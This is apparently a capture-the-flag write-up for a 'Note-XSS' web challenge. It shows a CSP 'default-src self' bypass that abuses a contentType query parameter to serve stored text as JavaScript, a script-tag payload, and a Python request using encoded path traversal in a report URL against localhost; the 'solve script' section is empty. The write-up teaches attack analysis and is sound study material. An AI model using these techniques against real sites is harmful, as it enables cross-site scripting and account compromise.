---
created: 2024-12-07T14:26
updated: 2024-12-08T13:17
solves: 54
points: 191
---

Note-XSS challenge, with CSP `default-src: self` and restricted report url.
## probe

- can access raw body via `/api/posts/[id]/body`
- We can change content type via `/path?contentType=text/javascript`

```ts
app.get(
    "*",
    handleAsync(async (req, res, next) => {
        const { error, data: query } = await assetsQuerySchema.safeParseAsync(req.query)
        if (!error) {
            res.header("content-type", query.contentType)
        }
...
```

It appears that `res.header` is set for every single path, as long as the query variable is set.
## csp

Using Google's CSP detector, we can see that the vulnerable CSP seems to be `default-src: self`.

How do we exploit this?

We can exploit the api endpoints to host JS files for us.

```js [payload A]
console.log("external script")
```

```html [payload B]
<script src="/api/posts/1/body?contentType=text/javascript"></script>
```

![image.png](https://res.cloudinary.com/kumonochisanaka/image/upload/v1733640901/2024/12/6fbd95c74bf12b3877d62659ab914a7b.png)

## xss

However to make the bot access body via `/api` directly isn't easy, I got stuck here and my teammate @T!T4N solved it.

The solution is to inject the report endpoint's url param.

```python
import requests

r = requests.post("http://localhost:3300/posts/23%2e%2e%2f%2e%2e%2f%2e%2e%2fapi%2fposts%2f21%3fcontentType=text%2fhtml/report")
print(r.text)

# http://localhost:3300/api/posts/21?contentType=text/html
```

## solve script
